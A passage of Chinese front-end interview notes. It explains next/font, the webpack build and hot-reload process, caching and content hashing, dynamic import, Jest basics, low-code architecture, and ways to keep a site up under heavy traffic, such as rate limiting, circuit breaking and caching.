   - **图片 / 视频**：将真实资源的 URL 赋值给 `src` 或 `srcset`，触发浏览器加载。
   - **列表内容**：动态渲染 DOM（如通过 API 请求数据并渲染）

### **next/font**

字体是影响页面渲染体验的关键资源（如字体加载延迟可能导致 “无样式文本闪烁 FOUT” 或 “不可见文本闪烁 FOIT”）。`next/font` 通过**本地化加载**和**智能加载策略**，解决字体加载的性能与体验问题。

- **本地化字体，消除第三方请求依赖**：传统加载字体的方式（如引用 Google Fonts 的外部链接）会产生第三方域名请求，可能面临：

  - DNS 解析、TCP 连接的额外耗时；
  - 第三方服务不稳定导致的加载失败；
  - 隐私合规问题（如 GDPR 对用户数据的追踪限制）。

  `next/font` 会在**构建时自动下载字体文件**（无论是 Google Fonts 还是本地字体），并将其作为项目静态资源托管，消除对外部域名的依赖。加载时直接从当前域名请求，减少网络开销，提升稳定性。

- **预加载关键字体（减少 FOIT/FOUT）**：字体加载延迟可能导致文本在 “无字体” 和 “有字体” 状态间切换（FOUT），或短暂不可见（FOIT），影响用户体验。`next/font` 会自动识别**关键字体**（如首屏文本使用的字体），并添加 `<link rel="preload">` 标签，让浏览器在早期优先加载，确保文本渲染时字体已就绪，减少闪烁。
- **优化字体格式与体积**：`next/font` 会自动选择**现代高效的字体格式**（如 WOFF2，比传统 TTF/OTF 体积小 40%+），并支持**字体子集化**（仅包含页面实际使用的字符，如中文页面只保留中文字符，剔除无用的其他语言字符），进一步减小字体文件体积，加快加载速度。
- **控制字体显示策略（`font-display`）**：`next/font` 允许通过配置 `display` 属性（如 `swap`、`fallback`）控制字体加载时的行为：
  - `swap`：字体加载期间先用默认字体显示，加载完成后立即替换（减少 FOIT，允许短暂 FOUT）；
  - `fallback`：短暂隐藏文本（如 100ms），超时后用默认字体显示，加载完成后替换（平衡 FOIT 和 FOUT）。通过合理配置，可在字体加载延迟时减少用户感知的体验损失。

- **避免重复加载与缓存优化**: `next/font` 会对字体资源进行哈希处理，生成唯一 URL，配合浏览器缓存策略（如长期缓存），确保用户第二次访问时直接从缓存读取，无需重复下载。

## 流式渲染是为了解决什么问题？

## 服务端组件有哪些特性和限制？

## next里面怎么实现服务器缓存？

# 前端工程化

## 构建

### webpack

#### 构建流程

1. **初始化配置**：读取配置文件（如webpack.config.js）,并解析出入口文件、输出路径、loader、plugin等配置信息。
2. **编译**：使用这些配置信息创建一个新的 `Compiler` 对象，然后调用这对象的`run`方法开始编译；
3. **确定入口**：根据配置中的`entry`找出所有的入口文件；
4. **编译模块**： 从**入口文件**开始，调用相应的**loader**对模块进行转换，然后解析出**模块的依赖**，对依赖的模块进行递归处理；
5. **完成模块编译**：在确定了所有模块的依赖关系后，每个模块会被转换成最终的**可执行代码**；
6. **输出**：根据入口和模块之间的**依赖关系**，组装成一个个**包含多个模块的Chunk**，再把每个Chunk转换成一个单独的文件加入到**输出列表**，这步是可以修改输出内容的最后机会；
7. **输出完成**：在确定好初始内容后，根据配置确定的**路径和文件名**，把文件内容写入到**文件系统**。

简单例子：

```js
const path = require('path');

module.exports = {
  entry: './src/index.js',
  output: {
    filename: 'bundle.js',
    path: path.resolve(__dirname, 'dist')
  },
  module: {
    rules: [
      {
        test: /\.css$/,
        use: ['style-loader', 'css-loader']
      }
    ]
  },
  plugins: [
    new HtmlWebpackPlugin({template: './src/index.html'})
  ]
};
```

在这个配置文件中，`entry` 指定了入口文件，`output` 指定了输出路径和文件名，`module.rules` 指定了处理 CSS 文件的 loader，`plugins` 指定了一个插件用于生成 HTML 文件。

#### 热更新原理

1. **编译阶段**：启用HMR插件后，webpack在编译阶段会向**bundle**中注入HMR runtime代码，这些代码主要负责**和服务端进行通信**，当服务端有模块更新时，获取更新的模块代码；
2. **Dev Sever**：轻量级服务器，在服务端监听文件的变化，当文件发生变化时，webpack会重新编译打包那部分的代码，并通过**Socket.js**向浏览器端发送更新的消息；
3. **浏览器处理阶段：**浏览器端的HMR runtime会接收到更新的消息，然后通过**JSONP**向服务端获取更新的模块文件，然后利用HMR runtime对新旧模块进行对比，替换掉旧的模块，最后通知应用代码模块已经更新；

#### 提高构建速度

提高 Webpack 构建速度需要从 **“减少重复工作”“并行处理”“缩小处理范围”** 三个核心方向入手，结合构建流程的关键环节（模块解析、Loader 处理、代码优化等）针对性优化。

##### 缓存优化：避免重复编译（核心提速手段）

Webpack 构建中，大量时间消耗在 “重复解析相同模块”“重复执行 Loader 转换” 上，通过缓存可直接复用之前的处理结果，减少 50% 以上的构建时间。

- **开启 Webpack 内置缓存**（Webpack 5+ 推荐）

  - Webpack 5 自带 `cache` 配置，支持将编译结果缓存到**文件系统**（替代 Webpack 4 的 `hard-source-webpack-plugin`），跨构建（如重启终端）也能复用缓存。

  - ```js
    // webpack.config.js
    module.exports = {
      cache: {
        type: 'filesystem', // 缓存到文件系统（默认内存缓存，重启丢失）
        cacheDirectory: path.resolve(__dirname, '.webpack-cache'), // 缓存目录路径
        // 可选：自定义缓存键（如依赖版本变化时失效）
        buildDependencies: {
          config: [__filename] // 当 webpack 配置文件变化时，缓存失效
        }
      }
    };
    ```

- **启用 Loader 缓存（针对耗时 Loader）**

  - 对于 `babel-loader`（转译 ES6+）、`ts-loader`（TypeScript 转译）等耗时 Loader，开启缓存可避免重复处理相同文件。

  - ```js
    // 以 babel-loader 为例
    module.exports = {
      module: {
        rules: [
          {
            test: /\.js$/,
            exclude: /node_modules/, // 排除第三方库（通常已转译）
            use: [
              {
                loader: 'babel-loader',
                options: {
                  cacheDirectory: true, // 开启缓存（默认缓存到 node_modules/.cache/babel-loader）
                  cacheCompression: false // 关闭缓存压缩（节省 CPU 时间）
                }
              }
            ]
          }
        ]
      }
    };
    ```

    

##### 多线程并行处理：利用多核 CPU 提速

- 用 `thread-loader` 加速 Loader 执行
- 用 `terser-webpack-plugin` 多线程压缩代码（生产环境）

#### 给资源设置hash

在 Webpack 中，给资源（JS、CSS、图片等）设置哈希（hash）的核心是通过配置 `output` 选项和各类 loader/plugin 的文件名规则，利用 Webpack 提供的哈希占位符（placeholder）生成带哈希的文件名。

##### 哈希类型：3 种常用占位符

Webpack 提供了 3 种哈希生成方式，适用场景不同：

| 占位符          | 生成逻辑                                                     | 适用场景                                     |
| --------------- | ------------------------------------------------------------ | -------------------------------------------- |
| `[hash]`        | 基于**整个项目的构建结果**生成的哈希（项目级）。每次构建只要有文件变化，哈希就会改变（即使目标文件没变）。 | 不常用（粒度太粗，会导致无关文件哈希变化）。 |
| `[chunkhash]`   | 基于**代码块（chunk）** 生成的哈希（chunk 级）。同一 chunk 内的文件哈希相同，只有 chunk 内容变化时哈希才会变。 | JS 文件（代码分割后的 chunk）。              |
| `[contenthash]` | 基于**文件自身内容**生成的哈希（文件级）。只有文件内容变化时，哈希才会变（最精准）。 | CSS、图片、字体等静态资源（推荐）。          |

##### 具体配置：按资源类型设置哈希

- **JS 文件**通过 `output` 配置：JS 文件的哈希通过 `webpack.config.js` 的 `output.filename` 和 `output.chunkFilename` 配置（前者对应入口文件，后者对应异步加载的 chunk）。

  ```js
  // webpack.config.js
  module.exports = {
    output: {
      // 入口 JS 文件：使用 contenthash（推荐，更精准）
      filename: 'js/[name].[contenthash:8].js', 
      // 异步加载的 JS chunk（如路由懒加载）：使用 contenthash
      chunkFilename: 'js/[name].[contenthash:8].chunk.js',
      // 输出目录（可选，统一放在 dist 下）
      path: path.resolve(__dirname, 'dist')
    }
  };
  ```

  - `[name]`：对应入口名称（如 entry 中的 `main`）或 chunk 名称。
  - `[contenthash:8]`：取哈希的前 8 位（默认更长，可简化）。

- **CSS 文件**配合 `mini-css-extract-plugin`：CSS 文件默认会被 `style-loader` 注入到 JS 中，若要生成独立的 CSS 文件并加哈希，需用 `mini-css-extract-plugin` 提取 CSS，再配置其文件名规则。

  ```js
  const MiniCssExtractPlugin = require('mini-css-extract-plugin');
  
  module.exports = {
    module: {
      rules: [
        {
          test: /\.css$/,
          // 用 MiniCssExtractPlugin.loader 替代 style-loader，提取 CSS 为单独文件
          use: [MiniCssExtractPlugin.loader, 'css-loader'] 
        }
      ]
    },
    plugins: [
      new MiniCssExtractPlugin({
        // CSS 文件名：使用 contenthash（只有 CSS 内容变，哈希才变）
        filename: 'css/[name].[contenthash:8].css',
        // 异步加载的 CSS chunk（如通过 splitChunks 拆分的 CSS）
        chunkFilename: 'css/[name].[contenthash:8].chunk.css'
      })
    ]
  };
  ```

- 图片、字体等静态资源通过 `url-loader` 或 `file-loader`：静态资源（如 `png`、`jpg`、`woff` 等）需通过 `url-loader` 或 `file-loader` 处理，在其 `options.name` 中配置哈希。

  ```js
  module.exports = {
    module: {
      rules: [
        {
          test: /\.(png|jpe?g|gif|svg)$/,
          use: [
            {
              loader: 'url-loader',
              options: {
                // 小于 8kb 的图片转 base64（嵌入 JS/CSS，不生成单独文件）
                limit: 8 * 1024, 
                // 大于 8kb 的图片：输出到 images 目录，文件名带 contenthash
                name: 'images/[name].[contenthash:8].[ext]',
                // 输出路径基于 output.path（即 dist/images/...）
                outputPath: 'images'
              }
            }
          ]
        },
        // 字体文件类似
        {
          test: /\.(woff2?|eot|ttf|otf)$/,
          use: [
            {
              loader: 'file-loader',
              options: {
                name: 'fonts/[name].[contenthash:8].[ext]'
              }
            }
          ]
        }
      ]
    }
  };
  ```

  

**注意事项**：

- **哈希长度控制**：通过 `[contenthash:8]` 取前 8 位（默认 20 位），平衡唯一性和文件名长度。

- **避免无关哈希变化**：

  - 若使用 `splitChunks` 拆分公共库（如 React、Vue），需确保公共库的 chunk 哈希稳定（可单独配置 `cacheGroups` 的 `filename`）。

    ```js
    optimization: {
      splitChunks: {
        cacheGroups: {
          vendor: { // 提取 node_modules 中的第三方库
            test: /[\\/]node_modules[\\/]/,
            name: 'vendors',
            chunks: 'all',
            filename: 'js/vendors.[contenthash:8].js' // 单独设置哈希
          }
        }
      }
    }
    ```

- **开发环境无需哈希**：哈希主要用于生产环境（`production`），开发环境（`development`）可简化文件名（如 `[name].js`），提升构建速度。

#### import

Webpack 中的动态加载（通常通过 `import()` 语法实现）是实现**代码分割（Code Splitting）** 的核心方式，其核心原理是：**在编译时将动态导入的模块拆分为独立的代码块（Chunk），在运行时按需加载这些代码块**，从而减少初始加载的代码体积，提升页面性能。

##### 原理

- **编译时：识别动态导入，拆分代码块（Chunk）**【**识别-拆分-映射表**】：Webpack 在编译过程中会解析代码中的 `import()` 语法（这是 ES 标准的动态导入提案，Webpack 对其进行了支持），并将其作为**代码分割点（split point）**，将目标模块及其依赖打包成一个独立的**异步代码块（Async Chunk）**。

  - **识别动态导入语法**：当代码中出现类似 `import('./module.js')` 的语法时，Webpack 的解析器（Parser）会将其识别为动态导入，并标记为需要进行代码分割的模块。例如，以下代码中，`HeavyModule` 不会被打包到主代码块（main chunk）中，而是会被单独拆分：

    ```js
    // 主文件：main.js
    document.getElementById('btn').addEventListener('click', async () => {
      // 点击按钮时才加载 HeavyModule
      const HeavyModule = await import('./HeavyModule.js');
      HeavyModule.doSomething();
    });
    ```

  - **拆分独立代码块（Chunk）:**Webpack 的编译流程中，会为动态导入的模块创建一个新的代码块（Chunk），并将该模块及其所有依赖（递归分析）打包到这个独立的文件中（通常命名为 `[name].[contenthash].js`，如 `789.js`）。

    - 主代码块（如 `main.js`）只包含触发动态加载的逻辑，不包含 `HeavyModule` 的代码；
    - 动态模块的代码块（如 `789.js`）仅包含 `HeavyModule` 及其依赖的代码。

  - **生成加载映射表:** Webpack 会在编译时生成一个**代码块映射表**（记录每个动态导入对应的代码块路径），并将其嵌入到主代码块的 “运行时（Runtime）” 逻辑中。运行时通过这个映射表知道：当执行到某个 `import()` 时，应该加载哪个路径的代码块。

- **运行时：动态加载代码块并执行**【**请求-处理-缓存**】：当代码运行到 `import()` 语句时，Webpack 的 “运行时（Runtime）” 代码会负责动态加载对应的代码块，并在加载完成后执行模块逻辑，最终返回模块的导出内容。
  - **触发加载请求：**运行时会根据编译时生成的**映射表**，确定动态模块对应的代码块 URL（如 `./789.js`），然后通过 动态创建 `<script>` 标签 的方式发起 HTTP 请求，加载该代码块。（注：早期 Webpack 可能使用 JSONP 方式加载，现代版本更倾向于标准的 `<script>` 加载，本质都是**异步请求**代码块。）
  - **加载完成后的处理：** 当代码块加载完成后，浏览器会自动执行该 JS 文件中的代码。Webpack 为每个异步代码块预设了 “注册逻辑”：
    - 将模块内容注册到 Webpack 的模块系统中（类似 `require.cache` 的机制）；
    - 触发 `import()` 返回的 Promise resolve，将模块的导出内容传递给调用方。
  -  **缓存机制：**为避免重复加载，Webpack 会对已加载的异步代码块进行缓存。当再次执行同一个 `import()` 时，会直接返回缓存中的模块内容，不再发起新的请求。

##### **简化逻辑**

主代码块（main.js）中的运行时逻辑

```js
// 编译后的 main.js（简化）
const runtime = {
  // 代码块映射表：key 是模块 ID，value 是代码块 URL
  chunkMap: {
    1: './789.js' // 假设 HeavyModule 对应的代码块 ID 是 1
  },
  // 已加载的模块缓存
  moduleCache: {},
  // 动态加载函数
  importChunk: (chunkId) => {
    return new Promise((resolve) => {
      if (runtime.moduleCache[chunkId]) {
        // 已缓存，直接返回
        resolve(runtime.moduleCache[chunkId]);
        return;
      }
      // 动态创建 script 标签加载代码块
      const script = document.createElement('script');
      script.src = runtime.chunkMap[chunkId];
      script.onload = () => {
        // 代码块加载完成后，从缓存中获取模块并 resolve
        resolve(runtime.moduleCache[chunkId]);
      };
      document.head.appendChild(script);
    });
  }
};

// 原代码中的动态导入被转换为调用 runtime.importChunk
document.getElementById('btn').addEventListener('click', async () => {
  const HeavyModule = await runtime.importChunk(1); // 加载 ID 为 1 的代码块
  HeavyModule.doSomething();
});
```

异步代码块（789.js）的逻辑

```js
// 编译后的 789.js（简化）
// 注册模块到运行时的缓存中
runtime.moduleCache[1] = (function() {
  // HeavyModule 的代码
  const HeavyModule = {
    doSomething: () => console.log('执行HeavyModule逻辑')
  };
  return HeavyModule;
})();
```

##### 关键特性与配置

- **命名代码块**：可以通过魔法注释指定代码块名称，如 `import(/* webpackChunkName: "heavy" */ './HeavyModule.js')`，编译后代码块会命名为 `heavy.[hash].js`，方便**调试**。
- **预加载 / 预连接**：通过魔法注释 `/* webpackPrefetch: true */` 或 `/* webpackPreload: true */` 让浏览器在空闲时预加载代码块（提升后续加载速度）
- **与路由结合**：在 React Router、Vue Router 等框架中，动态加载常与路由结合，实现 “路由级代码分割”（如加载某个路由时才加载对应的组件代码）

##### 总结

Webpack 动态加载的核心原理是：

1. **编译时**：识别 `import()` 语法，将目标模块拆分为独立的异步代码块，并生成代码块映射表；
2. **运行时**：当执行到 `import()` 时，通过运行时代码动态加载对应的代码块，执行后将模块内容返回并缓存。

## 测试

### jest

- 主要特性
- 如何编写单元测试

#### 主要特性

- 零配置
- mock函数

#### 如何编写单元测试

1. 使用it或test编写测试用例
2. 测试用例中使用断言（expect）来验证代码的行为
3. 执行测试

假设有个函数：

```js
function add(a, b) {
    return a + b;
}
```

测试用例：

```js
test('adds 1 + 2 to equal 3', () => {
    expect(add(1, 2)).toBe(3);
});
```

# 性能优化

## **LCP(TTFB、加载延迟、加载时间，渲染延迟)**

## 对项目做过哪些性能优化？

# 通用型业务

## 单页面应用要求seo优化，你会怎么做？

## 大文件上传

- **分片上传**：将大文件分割成多个小片，然后逐个上传。这样可以避免**网络问题**导致整个大文件上传失败，只需要重新上传**失败的片段**；
- **断点续传**：记录**已上传**的文件片段，当上传被中断时，可以从上次中断的地方继续上传，而不是重新上传整个文件；
- **并发上传**：同时上传对多个文件片段，可以加快上传速度；

## 长列表渲染

- **分页**：将长列表分成多个页面，每个页面只显示一部分数据，用户可以通过翻页来查看更多数据；

- **虚拟滚动**：只渲染当前视口内的列表项，当用户滚动时，动态更新视口内的列表项。这样大大减少DOM的节点数量，提高渲染性能；

# 项目

## Next.js 和 SPA 区别

| 维度     | SPA（纯 React/Vue）          | Next.js                               |
| -------- | ---------------------------- | ------------------------------------- |
| 渲染核心 | 客户端渲染（CSR）            | 多渲染策略（SSR/SSG/CSR/ISR）         |
| 路由     | 第三方库手动配置             | 文件系统自动路由                      |
| 首屏性能 | 较慢（依赖客户端 JS 加载）   | 更快（SSR/SSG 直接返回内容）          |
| SEO      | 差（动态内容难抓取）         | 优（静态 HTML 内容）                  |
| 适用场景 | 后台管理系统、交互密集型应用 | 博客、电商、资讯等需 SEO / 流量的场景 |

若使用 SSR，需服务器支持 **Node.js 环境**（或通过 Vercel、AWS Lambda 等无服务器平台部署），部署成本略高，但生态工具（如 Vercel）已简化流程。

**Next.js**内置更多优化功能：

- API 路由：可直接在 `pages/api` 目录编写后端接口（无需单独搭建服务器）。
- 图像 / 字体优化：自动压缩图片、懒加载、字体预加载等。
- 中间件：支持请求拦截、权限验证等逻辑。

## 低代码项目是怎么工作的

架构可分为 **前端层**、**数据层**、**核心引擎层**、**后端服务层** 三大层级，包含 7 个核心模块，各模块功能如下：

| 模块               | 所属层级   | 核心功能                                                     |
| ------------------ | ---------- | ------------------------------------------------------------ |
| 编辑器模块         | 前端层     | 提供可视化操作界面（拖拽组件、配置属性、编写逻辑），生成 / 修改 “应用定义”。 |
| 组件系统           | 前端层     | 内置基础 UI 组件（按钮、表格、表单等）和高级组件（图表、地图等），定义组件属性、事件和渲染逻辑。 |
| 应用定义（数据层） | 数据载体   | 以 JSON 格式记录应用的全量信息（组件树、数据源配置、状态变量、事件逻辑等），是各模块协作的 “中间语言”。 |
| 数据源管理模块     | 核心引擎层 | 管理与外部系统的连接（数据库、API、云服务等），生成 / 执行查询，处理认证与权限。 |
| 状态管理模块       | 核心引擎层 | 维护应用内全局 / 局部状态（如变量、组件数据、查询结果），处理数据更新与传递。 |
| 运行时引擎         | 核心引擎层 | 解析 “应用定义”，将组件配置转换为 DOM 渲染，绑定事件与状态，驱动应用运行。 |
| 后端服务模块       | 后端服务层 | 存储应用定义（JSON 格式）、处理用户权限、代理数据源请求（避免跨域）、管理团队协作。 |

- 前端层
  - 编辑器模块
  - 组件系统

- 数据层
  - 应用定义
- 核心引擎层
  - 数据源管理模块
  - 状态管理模块
  - 运行时引擎

- 后端服务层
  - 后端服务模块



### 模块协作流程

作流程可分为 **“编辑阶段”** 和 **“运行阶段”**，各模块通过 “应用定义” 和 “事件驱动” 机制联动：

#### 编辑阶段：生成应用定义

用户通过编辑器配置应用，各模块协作生成 “应用定义”（JSON）：

- **用户操作**：在编辑器中拖拽组件（如表格）、配置数据源（如连接 MySQL）、绑定查询（如 “查询用户列表”）、设置事件（如 “按钮点击时执行查询”）。
- **模块交互**：
  - 编辑器模块接收用户操作，调用 **组件系统** 获取组件元数据（如表格的 “数据源”“列配置” 属性），展示属性编辑面板；
  - 用户配置数据源时，编辑器调用 **数据源管理模块**，校验连接信息（如 MySQL 账号密码），生成数据源配置（保存到应用定义）；
  - 用户编写事件逻辑（如 “查询成功后将结果赋值给表格”）时，编辑器将逻辑转换为标准化语法（如 `{{ table1.data = usersQuery.data }}`），存入应用定义的 “事件脚本” 字段；
  - 最终，编辑器将所有配置（组件树、数据源、变量、事件）整合为 **应用定义（JSON）**，通过 **后端服务模块** 保存到数据库。

#### 运行阶段：解析应用定义并运行

用户预览 / 发布应用时，运行时引擎解析应用定义，驱动应用运行：

- **加载应用定义**：运行时引擎从 **后端服务模块** 获取目标应用的 JSON 定义；

- **初始化渲染**：

  - 运行时引擎解析 “组件树”，调用 **组件系统** 渲染组件（如根据表格配置生成 `<table>` 标签）；
  - 解析 “数据源配置”，通过 **数据源管理模块** 建立与外部系统的连接（如创建 MySQL 连接池）；
  - 解析 “初始变量”，通过 **状态管理模块** 初始化应用状态（如 `pageNum = 1`）；

- **事件驱动与数据流转（核心协作逻辑）**：

  例如用户点击 “查询按钮” 触发数据更新流程：

  1. 按钮组件触发 `onClick` 事件，运行时引擎执行事件脚本（如 `usersQuery.run()`）；
  2. **数据源管理模块** 接收查询执行请求，根据数据源配置发送请求（如向 MySQL 发送 `SELECT * FROM users`），并处理响应；
  3. 查询结果返回后，**状态管理模块** 更新对应变量（如 `usersQuery.data = [用户列表]`）；
  4. 状态变化触发 **运行时引擎** 重新渲染依赖该状态的组件（如表格组件读取 `usersQuery.data` 并更新表格内容）；

- **权限控制**：后端服务模块在每次请求（如加载应用、执行查询）时校验用户权限（如 “仅管理员可执行删除查询”），确保操作合法。

### 模块协作关系图

```
┌───────────────── 前端层 ─────────────────┐
│  ┌─────────────┐      ┌───────────────┐  │
│  │ 编辑器模块   │◄────►│  组件系统     │  │
│  └──────┬──────┘      └───────────────┘  │
└─────────┼────────────────────────────────┘
          │ 生成/修改
          ▼
┌───────────────── 数据层 ─────────────────┐
│        应用定义（JSON格式）              │
│  （组件树+数据源+变量+事件逻辑）         │
└─────────┬────────────────────────────────┘
          │ 解析/执行
          ▼
┌───────────────── 核心引擎层 ──────────────┐
│  ┌─────────────┐      ┌───────────────┐  │
│  │ 运行时引擎   │◄────►│  状态管理模块  │  │
│  └──────┬──────┘      └───────────────┘  │
│         │                               │
│         ▼                               │
│  ┌───────────────────────────────────┐   │
│  │         数据源管理模块            │   │
│  └──────────────────┬────────────────┘   │
└────────────────────┼─────────────────────┘
                     │ 代理请求/存储/权限
                     ▼
┌───────────────── 后端服务层 ──────────────┐
│  ┌─────────────┐      ┌───────────────┐  │
│  │ 应用存储     │      │ 权限与协作    │  │
│  └─────────────┘      └───────────────┘  │
│  ┌─────────────┐                         │
│  │ 数据源代理   │◄──────────────────┐    │
│  └──────┬──────┘                   │    │
└─────────┼───────────────────────────┘    │
          │                                │
          ▼                                │
┌───────────────── 外部系统 ────────────────┐
│ 数据库（MySQL/PostgreSQL）、API、云服务等 │
└──────────────────────────────────────────┘
```



# 场景

## 防止访问量过大导致网站崩掉

### 核心原则

工程师的核心目标是让系统 “**可预测、可控制、可恢复**”：

- 可预测：通过压测明确系统极限（最大 QPS、能承载的并发用户数）；
- 可控制：通过限流、熔断、降级主动控制流量，避免过载；
- 可恢复：通过监控、备份、应急机制，故障时快速恢复，减少影响。

从 “预防（架构优化、缓存）→ 控制（限流、队列）→ 监控（全链路监控）→ 应急（降级、扩容）” 形成闭环，

### 压测

- **模拟高流量压测**：用 JMeter、Locust 等工具模拟黑五峰值流量（如 20 万 QPS），测试系统在极限压力下的表现，找出瓶颈（如某个接口扛不住、数据库连接池满了）。
- **重点场景专项压测**：针对核心流程（如商品详情→加购→下单→支付）单独压测，确保关键链路的稳定性。
- **持续压测优化**：压测后针对性优化（如给慢接口加缓存、扩容数据库从库），再反复压测，直到系统能稳定承载目标流量的 1.5 倍（留冗余）。

### 流量控制

**主动 “限流” 与 “错峰”**

#### 多级限流：从入口到服务层层拦截

**入口限流**：在负载均衡层（如 Nginx）设置全局限流，拒绝超出集群承载能力的流量（避免 “洪水冲垮整个系统”）。例：Nginx 用 `limit_req` 模块限制单 IP 每秒最多 10 个请求，总 QPS 限制在 10 万（根据集群最大承载能力设定）。

```nginx
# Nginx 配置示例
http {
  limit_req_zone $binary_remote_addr zone=perip:10m rate=10r/s; # 单IP限流
  limit_req_zone $server_name zone=perserver:10m rate=100000r/s; # 全局限流
  server {
    location / {
      limit_req zone=perip burst=5 nodelay; # 允许5个突发请求
      limit_req zone=perserver burst=1000 nodelay;
    }
  }
}
```

**服务级限流**：用 Sentinel、Resilience4j 等工具对单个服务 / 接口设置限流阈值，保护核心接口。

**分布式限流**：用 Redis + Lua 脚本实现跨服务的全局限流（如全网站下单总 QPS 不超过 5 万），避免单服务限流失效。

例：通过 Redis 的 `incr` 命令计数，超过阈值则拒绝，Lua 脚本保证原子性：

```lua
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local current = tonumber(redis.call('get', key) or "0")
if current >= limit then
  return 0 -- 超过限流
else
  redis.call('incr', key)
  redis.call('expire', key, 1) -- 1秒过期
  return 1 -- 允许访问
end
```

#### 熔断与降级：牺牲非核心，保核心

- **熔断**：当依赖的服务（如支付接口）出现故障（超时率 > 50%），自动 “断开连接”，避免故障扩散到整个链路。用 Sentinel 或 Hystrix 实现，熔断期间直接返回预设结果（如 “支付服务繁忙，稍后重试”）。
- **降级**：流量高峰时，主动关闭非核心功能，释放资源给核心流程。例：黑五期间，关闭 “商品分享”“浏览历史” 等功能，停止非核心接口的计算（如商品推荐算法），仅返回基础数据；图片加载降级为低清晰度版本，减少带宽消耗。

#### 队列削峰：将 “突发流量” 转为 “平稳流量”

对**高并发写操作**（如秒杀下单、提交订单），用消息队列（Kafka、RabbitMQ）缓冲请求，后端消费者按 “集群处理能力” 匀速消费，避免瞬间压垮数据库。

例：用户下单请求先发送到 Kafka 队列，后端部署 10 个消费者实例，每个实例每秒处理 100 单，总处理能力 1000 单 / 秒，队列自动堆积突发的 5000 单请求，后续逐步消化。

### 资源层：减少消耗，提升效率

#### 多级缓存：减轻数据库压力

- **浏览器缓存**：静态资源（JS、CSS、图片）设置长缓存（`Cache-Control: max-age=31536000`），配合文件哈希（如 `style.abc123.css`），更新时哈希变化，自动失效旧缓存。
- **CDN 缓存**：将静态资源（图片、视频）和非实时动态页面（如商品详情页）放到 CDN，用户从最近的节点获取资源，减少源站请求。
- **应用层缓存**：用 Redis 缓存热点数据（如商品库存、首页 Banner），设置合理过期时间（如 10 分钟），避免频繁查询数据库。
- **本地缓存**：服务内存中缓存高频访问的静态数据（如国家列表、分类信息），用 Caffeine 等工具实现，减少 Redis 访问。

#### 静态资源与动态内容分离

- 静态资源（图片、JS、CSS）部署到对象存储（如 AWS S3、阿里云 OSS），通过 CDN 分发，不占用应用服务器资源。
- 动态内容（如实时库存、用户订单）由应用服务处理，但尽量通过缓存减少计算和数据库访问。

#### 数据库优化

- **连接池调优**：设置合理的数据库连接池大小（如 50-100 个连接），避免连接数过多导致数据库崩溃（每个连接消耗内存，超过数据库最大连接数会拒绝新连接）。
- **索引优化**：对高频查询字段（如商品 ID、用户 ID）建索引，避免全表扫描；用 `explain` 分析慢查询，优化 SQL。
- **禁止大事务**：拆分长事务（如 “下单 + 扣库存 + 日志” 拆分为多个小事务），减少锁表时间，避免并发阻塞。

### 监控与应急：提前发现，快速恢复

#### 全链路监控

- **基础设施监控**：用 Prometheus + Grafana 监控服务器 CPU、内存、磁盘 IO、网络带宽，数据库连接数、慢查询数，Redis 内存使用率、命中率等，设置阈值告警（如 CPU > 80% 告警）。
- **应用性能监控**：用 SkyWalking、New Relic 监控接口响应时间、错误率、QPS，追踪调用链路，定位瓶颈（如某个接口耗时突然从 100ms 增至 1s）。
- **业务监控**：监控核心指标（如下单成功率、支付转化率），异常时（如下单成功率 < 90%）立即告警。

#### 应急响应机制

- **故障演练**：提前进行 “混沌工程” 测试（如故意 kill 掉 1 台应用服务器、断开某个数据库从库），验证系统容错能力和自动恢复能力。
- **降级开关**：开发全局降级开关（如通过 Redis 存储开关状态），紧急时一键关闭非核心功能（如后台配置 `degrade: true`，服务读取后自动降级）。
- **流量切换**：准备备用集群（如异地多活），当主集群压力过大时，通过 DNS 或负载均衡将部分流量切到备用集群。
- **快速扩容预案**：提前与云厂商沟通，预留临时资源（如突发扩容到 200 台服务器），避免高峰期资源不足无法扩容。

#### 数据备份与恢复

- 数据库定时全量备份（每天）+ 增量备份（每小时），备份文件存储在异地，确保数据损坏时可回滚到最近时间点。
- 关键业务（如订单）开启 binlog，支持基于时间点的精确恢复（如恢复到崩溃前 10 分钟的数据）。

## 服务端渲染

- **提升首屏加载速度，减少 “白屏时间”**
- **优化 SEO（搜索引擎优化）**
- **改善内容 “首屏可见性”（FCP）**
- **降低客户端设备的性能压力**
- **更可靠的首屏数据加载**

服务端渲染本质是**将 “页面生成的压力” 从客户端转移到服务器**，通过提前生成完整内容的 HTML，解决客户端渲染在 “首屏速度、SEO、低设备兼容性” 上的短板。

它并非 “替代客户端渲染”，而是与客户端渲染结合（如 Next.js 中，首屏用 SSR，后续交互用客户端 JS），平衡性能、体验和开发效率 —— 尤其适合面向公开用户、依赖搜索流量、对首屏体验敏感的场景（如电商、官网、内容平台）。

## 访问旧版资源

用户访问到旧版本资源的核心原因是**缓存机制**（浏览器缓存、CDN 缓存、服务器缓存等）导致资源未及时更新。

### **静态资源：通过 “内容指纹” 避免缓存混淆**

静态资源（JS、CSS、图片、字体等）是缓存的重灾区，核心思路是**让 “内容变化” 对应 “资源路径变化”**，使浏览器 / CDN 认为是 “新资源” 而不使用旧缓存。

- **具体实现**：利用构建工具（Webpack、Vite、Rollup 等）为资源文件名添加**内容哈希（content hash）**。例如：
  - 旧版本：`app.js` → 新版本：`app.8f2d71.js`（哈希值随内容变化而变化）。
  - 原理：当资源内容修改时，哈希值自动更新，文件名改变，浏览器 / CDN 会重新请求新文件，而非使用缓存的旧文件。
- **注意**：
  - 仅对**内容频繁变化的资源**（如业务 JS/CSS）添加哈希；对于长期不变的资源（如第三方库、通用图片），可使用版本号（如`lib/v2/jquery.js`）减少哈希计算开销。
  - 确保 HTML 文件不缓存（见下文），因为 HTML 是引用这些带哈希资源的 “入口”，若 HTML 被缓存，会继续引用旧的哈希资源。

### **缓存策略：通过 HTTP 头精准控制缓存行为**

针对不同类型的资源（HTML、静态资源、API 数据）设置差异化的缓存规则，通过`Cache-Control`等 HTTP 响应头告诉浏览器 / CDN “如何缓存”。

| 资源类型         | 缓存需求               | 推荐 HTTP 头配置                                             |
| ---------------- | ---------------------- | ------------------------------------------------------------ |
| HTML 文件        | 禁止强缓存，每次验证   | `Cache-Control: no-cache`（强制浏览器每次请求时验证资源是否更新）`ETag: "版本标识"`（服务器返回资源唯一标识，浏览器下次请求携带验证） |
| 带哈希的静态资源 | 长期缓存（内容不变）   | `Cache-Control: public, max-age=31536000, immutable`（缓存 1 年，且标记为 “不可变”，避免重复验证） |
